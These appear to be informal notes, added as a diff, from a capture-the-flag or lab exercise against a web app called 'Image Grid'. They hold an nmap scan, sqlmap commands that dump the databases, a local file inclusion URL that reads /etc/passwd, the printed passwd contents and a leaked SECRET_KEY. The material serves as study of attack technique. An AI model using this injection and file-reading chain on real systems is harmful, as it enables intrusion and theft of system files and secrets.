@@ -1,0 +1,171 @@
+# Nmap scan:
+kali@kali:~/Downloads$ nmap -T4 -A -O 10.10.161.71
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-10 14:22 IST
+Nmap scan report for 10.10.161.71
+Host is up (0.24s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 (protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.62 ((Debian))
+|_http-title: Image Grid
+|_http-server-header: Apache/2.4.62 (Debian)
+25243/tcp filtered unknown                                                                                         
+26563/tcp filtered unknown                                                                                         
+31492/tcp filtered unknown                                                                                         
+42234/tcp filtered unknown                                                                                         
+47115/tcp filtered unknown                                                                                         
+49431/tcp filtered unknown                                                                                         
+49663/tcp filtered unknown
+52014/tcp filtered unknown
+57452/tcp filtered unknown
+
+Network Distance: 2 hops
+
+TRACEROUTE (using port 21/tcp)
+HOP RTT       ADDRESS
+1   206.47 ms 10.21.0.1
+2   474.44 ms 10.10.161.71
+
+
+# Finds:
+I tried the SQL injection on 
+http://10.10.161.71/album.php?short_tag=
+and that worked , lets try to dig in using the sql injections:
+
+We ran the SQLMAP on the link:
+1: sqlmap -u "http://10.10.161.71/album.php?short_tag=cute"  --level=5 --risk=3
+2:sqlmap -u "http://10.10.161.71/album.php?short_tag=cute"  -dbs
+
+Now -D for the database you want to extract the information from:
+3:sqlmap -u "http://10.10.161.71/album.php?short_tag=cute"  -D web --tables
+4: sqlmap -u "http://10.10.161.71/album.php?short_tag=cute" -D web -T albums --columns
+5:sqlmap -u "http://10.10.161.71/album.php?short_tag=cute" --dump-all
+
+
+available databases [2]:                                                                                          
+[*] information_schema
+[*] web
+
+### Tables:
+# 1: information_schema:
+ALL_PLUGINS                           |
+| APPLICABLE_ROLES                      |
+| CHARACTER_SETS                        |
+| CHECK_CONSTRAINTS                     |
+| CLIENT_STATISTICS                     |
+| COLLATIONS                            |
+| COLLATION_CHARACTER_SET_APPLICABILITY |
+| COLUMN_PRIVILEGES                     |
+| ENABLED_ROLES                         |
+| FILES                                 |
+| GEOMETRY_COLUMNS                      |
+| GLOBAL_STATUS                         |
+| GLOBAL_VARIABLES                      |
+| INDEX_STATISTICS                      |
+| INNODB_BUFFER_PAGE                    |
+| INNODB_BUFFER_PAGE_LRU                |
+| INNODB_BUFFER_POOL_STATS              |
+| INNODB_CMP                            |
+| INNODB_CMPMEM                         |
+| INNODB_CMPMEM_RESET                   |
+| INNODB_CMP_PER_INDEX                  |
+| INNODB_CMP_PER_INDEX_RESET            |
+| INNODB_CMP_RESET                      |
+| INNODB_FT_BEING_DELETED               |
+| INNODB_FT_CONFIG                      |
+| INNODB_FT_DEFAULT_STOPWORD            |
+| INNODB_FT_DELETED                     |
+| INNODB_FT_INDEX_CACHE                 |
+| INNODB_FT_INDEX_TABLE                 |
+| INNODB_LOCKS                          |
+| INNODB_LOCK_WAITS                     |
+| INNODB_METRICS                        |
+| INNODB_SYS_COLUMNS                    |
+| INNODB_SYS_FIELDS                     |
+| INNODB_SYS_FOREIGN                    |
+| INNODB_SYS_FOREIGN_COLS               |
+| INNODB_SYS_INDEXES                    |
+| INNODB_SYS_TABLES                     |
+| INNODB_SYS_TABLESPACES                |
+| INNODB_SYS_TABLESTATS                 |
+| INNODB_SYS_VIRTUAL                    |
+| INNODB_TABLESPACES_ENCRYPTION         |
+| INNODB_TRX                            |
+| KEYWORDS                              |
+| KEY_CACHES                            |
+| KEY_COLUMN_USAGE                      |
+| OPTIMIZER_TRACE                       |
+| PARAMETERS                            |
+| PROFILING                             |
+| REFERENTIAL_CONSTRAINTS               |
+| ROUTINES                              |
+| SCHEMATA                              |
+| SCHEMA_PRIVILEGES                     |
+| SESSION_STATUS                        |
+| SESSION_VARIABLES                     |
+| SPATIAL_REF_SYS                       |
+| SQL_FUNCTIONS                         |
+| STATISTICS                            |
+| SYSTEM_VARIABLES                      |
+| TABLESPACES                           |
+| TABLE_CONSTRAINTS                     |
+| TABLE_PRIVILEGES                      |
+| TABLE_STATISTICS                      |
+| THREAD_POOL_GROUPS                    |
+| THREAD_POOL_QUEUES                    |
+| THREAD_POOL_STATS                     |
+| THREAD_POOL_WAITS                     |
+| USER_PRIVILEGES                       |
+| USER_STATISTICS                       |
+| VIEWS                                 |
+| COLUMNS                               |
+| ENGINES                               |
+| EVENTS                                |
+| PARTITIONS                            |
+| PLUGINS                               |
+| PROCESSLIST                           |
+| TABLES                                |
+| TRIGGERS                              |
+| user_variables 
+
+# 2: Web:
+| albums |
+| images |
++--------+
+
+NOTHING IMPORTANT WAS FOUND BY ME:
+
+
+# NEW FIND 1:
+Here the site is filtering our file access based on the hashes:
+it calculates the hash of the file: and prohibits us from accessing the internal files using the sql injection to read the files.
+
+
+#
+After the sql injection attacks: we understood there are two sql statements at work here:
+we escalated it to the local file inclusion:
+to get the hash of the /etc/passwd file
+<a href="/image.php?hash=9fa6eacac1714e10527da6f9cf8570e46a5747d9ace37f4f9e963f990429310d&path=/etc/passwd"><img src="/image.php?hash=9fa6eacac1714e10527da6f9cf8570e46a5747d9ace37f4f9e963f990429310d&path=/etc/passwd" alt="Image path: /etc/passwd"></a>
+
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+
+
+$SECRET_KEY='an8h6oTlNB9N0HNcJMPYJWypPR2786IQ4I3woPA1BqoJ7hzIS0qQWi2EKmJvAgOW'
